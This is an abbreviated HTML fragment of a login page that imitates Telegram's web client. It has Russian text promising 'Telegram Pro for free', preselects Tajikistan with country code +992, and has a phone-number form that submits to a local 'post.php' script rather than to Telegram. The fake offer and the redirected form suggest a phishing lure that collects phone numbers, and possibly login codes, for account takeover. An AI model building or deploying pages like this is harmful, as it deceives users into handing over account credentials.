  ...
  <div class="login_page">
    ...
    <div class="login_form_wrap">
      ...
      <!----><form action="post.php" method="post" name="mySendCodeForm" ng-if="!credentials.phone_code_hash" ng-submit="sendCode()" class="ng-pristine ng-invalid ng-invalid-required">
        ...
        <p class="login_form_lead" my-i18n="login_enter_number_description">Зарегистрируйтесь что бы получить Telegram Pro бесплатно!.</p>

        <div class="md-input-group md-input-has-value login_phone_country_input_group" ng-click="chooseCountry()">
          <label class="md-input-label" my-i18n="login_country_select_placeholder">Страна</label>
          <div autocomplete="off" class="md-input" ng-bind="credentials.phone_country_name">Таджикистан</div>
        </div>
        ...
        <div class="login_phone_groups_wrap clearfix">
          ...
          <div class="md-input-group login_phone_code_input_group md-input-has-value md-input-animated" ng-class="{'md-input-error': error.field == 'phone'}" my-labeled-input="">
            ...
            <input autocomplete="off" class="md-input ng-pristine ng-valid ng-not-empty ng-touched" my-focused="" name="phone_country" type="tel" ng-model="credentials.phone_country" style="" value="+992">
          </div>
